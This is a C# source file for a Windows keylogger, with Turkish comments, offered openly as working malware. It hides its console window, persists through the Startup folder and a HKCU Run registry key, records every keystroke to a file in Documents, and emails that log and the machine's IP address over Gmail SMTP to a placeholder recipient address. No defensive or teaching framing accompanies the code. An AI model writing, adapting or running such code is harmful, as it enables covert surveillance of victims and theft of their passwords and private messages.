using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SW_HIDE = 0;

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        static void Main(string[] args)
        {
            // Konsol penceresini gizle
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_HIDE);

            // Programı başlangıç klasörüne ekle
            AddToStartup();

            // Keylogger'ı ayrı bir iş parçacığında başlat
            Thread keyLoggerThread = new Thread(StartKeyLogging);
            keyLoggerThread.IsBackground = true;
            keyLoggerThread.Start();

            // IP adresini al ve e-posta ile gönder
            SendIpAddressByEmail();

            // Ana iş parçacığını canlı tut
            while (true) { Thread.Sleep(1000); } // Sonsuz döngüde bekle
        }

        static void AddToStartup()
        {
            string sourceFilePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string exeName = Path.GetFileName(sourceFilePath);

            // Başlangıç klasörüne ekleme
            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string destinationFilePath = Path.Combine(startupFolderPath, exeName);

            try
            {
                if (sourceFilePath != destinationFilePath)
                {
                    File.Copy(sourceFilePath, destinationFilePath, true);
                    Console.WriteLine("Başlangıç klasörüne eklendi.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Başlangıç klasörüne ekleme hatası: {ex.Message}");
            }

            // Kayıt defterine ekleme
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue(exeName, sourceFilePath);
                Console.WriteLine("Kayıt defterine eklendi.");
            }
        }

        static void StartKeyLogging()
        {
            StringBuilder log = new StringBuilder();
            string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "keylog.txt");

            while (true)
            {
                for (int i = 0; i < 256; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        log.Append((char)i);

                        // Log dosyasını güncelle
                        File.AppendAllText(logFilePath, log.ToString());
                        log.Clear();

                        // Log dosyasını e-posta ile gönder
                        SendEmailWithAttachment(logFilePath);
                    }
                }
                Thread.Sleep(100); // Yüksek CPU kullanımını önlemek için
            }
        }

        static void SendEmailWithAttachment(string filePath)
        {
            try
            {
                string smtpAddress = "smtp.gmail.com"; // SMTP sunucusu adresi
                int portNumber = 587; // SMTP port numarası
                bool enableSSL = true; // SSL kullanımı
                string emailFrom = "your_email@gmail.com"; // Gönderici e-posta adresi
                string password = "your_password"; // Gönderici e-posta adresi şifresi
                string emailTo = "recipient@example.com"; // Alıcı e-posta adresi
                string subject = "KeyLogger Log"; // E-posta konusu
                string body = "KeyLogger tarafından yakalanan tuş vuruşları ve IP adresi."; // E-posta gövdesi

                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(emailFrom);
                    mail.To.Add(emailTo);
                    mail.Subject = subject;
                    mail.Body = body;
                    mail.IsBodyHtml = false;
                    mail.Attachments.Add(new Attachment(filePath));

                    using (SmtpClient smtp = new SmtpClient(smtpAddress, portNumber))
                    {
                        smtp.Credentials = new NetworkCredential(emailFrom, password);
                        smtp.EnableSsl = enableSSL;
                        smtp.Send(mail);
                    }
                }
            }
            catch (Exception ex)
            {
                // Hata yönetimi, e-posta gönderim hatalarını ele almak için
                Console.WriteLine($"E-posta gönderme hatası: {ex.Message}");
            }
        }

        static void SendIpAddressByEmail()
        {
            try
            {
                string smtpAddress = "smtp.gmail.com"; // SMTP sunucusu adresi
                int portNumber = 587; // SMTP port numarası
                bool enableSSL = true; // SSL kullanımı
                string emailFrom = "your_email@gmail.com"; // Gönderici e-posta adresi
                string password = "your_password"; // Gönderici e-posta adresi şifresi
                string emailTo = "recipient@example.com"; // Alıcı e-posta adresi
                string subject = "KeyLogger IP Address"; // E-posta konusu
                string body = $"Bilgisayarın IP Adresi: {GetLocalIpAddress()}"; // E-posta gövdesi

                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(emailFrom);
                    mail.To.Add(emailTo);
                    mail.Subject = subject;
                    mail.Body = body;
                    mail.IsBodyHtml = false;

                    using (SmtpClient smtp = new SmtpClient(smtpAddress, portNumber))
                    {
                        smtp.Credentials = new NetworkCredential(emailFrom, password);
                        smtp.EnableSsl = enableSSL;
                        smtp.Send(mail);
                    }
                }
            }
            catch (Exception ex)
            {
                // Hata yönetimi, e-posta gönderim hatalarını ele almak için
                Console.WriteLine($"E-posta gönderme hatası: {ex.Message}");
            }
        }

        static string GetLocalIpAddress()
        {
            try
            {
                string ipAddress = null;
                foreach (IPAddress ip in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        ipAddress = ip.ToString();
                        break;
                    }
                }
                return ipAddress;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"IP adresi alma hatası: {ex.Message}");
                return null;
            }
        }
    }
}